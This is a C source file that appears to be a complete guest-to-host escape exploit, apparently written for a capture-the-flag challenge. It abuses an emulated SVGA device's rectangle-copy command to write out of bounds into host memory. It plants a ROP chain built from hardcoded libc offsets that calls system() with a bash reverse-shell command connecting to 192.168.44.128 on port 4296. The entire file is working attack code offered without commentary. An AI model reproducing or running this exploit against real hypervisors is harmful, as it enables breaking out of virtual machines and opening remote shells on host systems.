// gcc exploit_ptmoon.c -o exploit

#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>

#define PIO_BASE 0xc030
#define SVGA_INDEX_PORT         0x0
#define SVGA_VALUE_PORT         0x1
#define SVGA_BIOS_PORT          0x2
#define PORT_OUT(addr, val) (outb((val), PIO_BASE + (addr)))
#define PORT_IN(addr)       (inb(PIO_BASE + (addr)))

static uintptr_t virt2phys(uintptr_t addr);
static void dump(void *buf, size_t size);

#define OFFSET(addr)	((addr) - (TEXT_BASE))
#define ADDR(offset)	(addr_libc_base + (offset))

uintptr_t addr_libc_base = 0x00007ffff7844000;
const uint64_t ofs_libc_system         = 0x055230;
const uint64_t ofs_libc_exit           = 0x045240;
const uint64_t ofs_libc_ret            = 0x026a3e;
const uint64_t ofs_libc_rdi            = 0x028715;

const uintptr_t addr_vram_base = 0x00007fff66c00000;

enum {
    SVGA_CMD_RECT_COPY = 3,
};

enum {
    SVGA_REG_SYNC = 21,                 /* Write to force synchronization */
};

struct reg_fifo {
	uint32_t min;
	uint32_t max;
	uint32_t next;
	uint32_t stop;
	uint32_t data[];
};

static struct reg_fifo *fifo;
static void copy_vram(uint32_t dst, uint32_t src, size_t size);

int main(int argc, char *argv[]){
	int fifo_fd, vram_fd;
	void *vmem, *vram;
	uint32_t buf[0x10];

	if(ioperm(PIO_BASE, 4, 1)){
		perror("ioperm");
		return -1;
	}

	if((fifo_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource2", O_RDWR|O_SYNC)) == -1){
		perror("open fifo");
		return -1;
	}

	if((fifo = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fifo_fd, 0)) == MAP_FAILED){
		perror("mmap fifo");
		return -1;
	}

	if((vram_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource1", O_RDWR|O_SYNC)) == -1){
		perror("open vram");
		return -1;
	}

	if((vram = mmap(NULL, 0x2000, PROT_READ|PROT_WRITE, MAP_SHARED, vram_fd, 0)) == MAP_FAILED){
		perror("mmap vram");
		return -1;
	}

	//dump(vram, 0x80);

	const uintptr_t addr_target = 0x7ffff76e1000;

	strcpy(vram, "bash -c \"sh -l > /dev/tcp/192.168.44.128/4296 0<&1 2>&1\"");
	uint64_t *p = (uint64_t*)vram+0x40;
	for(int i=0; i<0x200; i++)
		*p++ = ADDR(ofs_libc_ret);
	*p++ = ADDR(ofs_libc_rdi);
	*p++ = addr_target;
	*p++ = ADDR(ofs_libc_system);
	*p++ = ADDR(ofs_libc_rdi);
	*p++ = 0;
	*p++ = ADDR(ofs_libc_exit);
	copy_vram(addr_target-addr_vram_base, 0, (void*)p-(void*)vram);

	munmap(vram, 0x2000);
	close(vram_fd);
	munmap(fifo, 0x1000);
	close(fifo_fd);

	ioperm(PIO_BASE, 4, 0);

	system("reboot");

	return 0;
}

static void copy_vram(uint32_t dst, uint32_t src, size_t size){
	fifo->min = fifo->next = fifo->stop = offsetof(struct reg_fifo, data);

	uint32_t *p = &fifo->data[0];
	*p++ = SVGA_CMD_RECT_COPY;
	*p++ = (src-0x80000*0xc80)/4;
	*p++ = 0x80000;
	*p++ = (dst-0x80000*0xc80)/4;
	*p++ = 0x80000;
	*p++ = size/4;
	*p++ = 0;

	fifo->next += sizeof(uint32_t)*(p-&fifo->data[0]);

	PORT_OUT(SVGA_VALUE_PORT, SVGA_REG_SYNC);
	sleep(1);
}

static uintptr_t virt2phys(uintptr_t addr){
	static int map_fd = -1;
	uintptr_t base;

	if(map_fd < 0)
		map_fd = open("/proc/self/pagemap", O_RDONLY);

	lseek(map_fd, sizeof(uintptr_t)*(addr >> 12), SEEK_SET);
	if(read(map_fd, &base, sizeof(uintptr_t)) < sizeof(uintptr_t))
		return -1;
	
	if(!(base & (1UL<<63)))
		return -1;

	base <<= 12;
	printf("virt : 0x%016lx -> phys : 0x%016lx\n", addr & ~((1<<12)-1), base);

	return base | (addr & ((1<<12)-1));
}

static void dump(void *buf, size_t size){
	uint64_t *p = buf;

	printf("=== DUMP (%p-%p) ===\n", buf, buf+size);
	for(uint64_t i=0; i<size/8; i++){
		printf("%016lx ", p[i]);
		if(i%4 == 3)
			printf("\n");
	}
	printf("\n");
}
